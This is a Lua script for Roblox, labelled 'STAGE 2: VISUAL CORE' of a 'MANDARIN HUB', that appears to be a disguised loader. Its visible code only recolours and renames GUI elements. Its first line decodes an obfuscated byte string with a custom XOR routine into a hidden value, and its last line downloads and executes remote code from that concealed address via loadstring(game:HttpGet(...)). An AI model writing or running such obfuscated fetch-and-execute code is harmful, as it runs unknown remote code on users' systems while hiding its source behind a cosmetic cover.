
--[[ STAGE 2: VISUAL CORE ]]
local bZrxkp8bpI_l68zO="\051\034\029\028\020\200\206\201\003\013\118\112\122\120\108\098\029\099\082\079\008\064\076\177\116\089\076\188\149\083\147\155\164"local pJlVm358GTHUulx=191 local lMWDWbjaB2KDHr0fAbctj=9 local cHZPeE1QSNdSA3B=1 local H9zVNWDNqaLNYOLpq821bX=5 local ppde1YuHVSvjnBesvcy=22 local bz3gGTDEitO8vv21=false local fy_4cdVnol4QVFHI1jO=bit32 and bit32.bxor if not fy_4cdVnol4QVFHI1jO then fy_4cdVnol4QVFHI1jO=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local OaRoK0QMrxPchZyQ={}for Qm5a4S2OUZiKjISAT=1,#bZrxkp8bpI_l68zO do local hri69S50eELjDQpW9YA8=string.byte(bZrxkp8bpI_l68zO,Qm5a4S2OUZiKjISAT)local XJFdfS8nAVPWM=(lMWDWbjaB2KDHr0fAbctj+(Qm5a4S2OUZiKjISAT*H9zVNWDNqaLNYOLpq821bX)+ppde1YuHVSvjnBesvcy)%256 if cHZPeE1QSNdSA3B==0 then hri69S50eELjDQpW9YA8=(hri69S50eELjDQpW9YA8-XJFdfS8nAVPWM)%256 OaRoK0QMrxPchZyQ[Qm5a4S2OUZiKjISAT]=string.char(fy_4cdVnol4QVFHI1jO(hri69S50eELjDQpW9YA8,pJlVm358GTHUulx))else hri69S50eELjDQpW9YA8=fy_4cdVnol4QVFHI1jO(hri69S50eELjDQpW9YA8,pJlVm358GTHUulx)OaRoK0QMrxPchZyQ[Qm5a4S2OUZiKjISAT]=string.char((hri69S50eELjDQpW9YA8-XJFdfS8nAVPWM)%256)end end local Dbnzxvq93NvP=table.concat(OaRoK0QMrxPchZyQ)if bz3gGTDEitO8vv21 then Dbnzxvq93NvP=string.reverse(Dbnzxvq93NvP)end local Q_jqjGWhGn6f4cvr=Dbnzxvq93NvP
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Q_jqjGWhGn6f4cvr))()
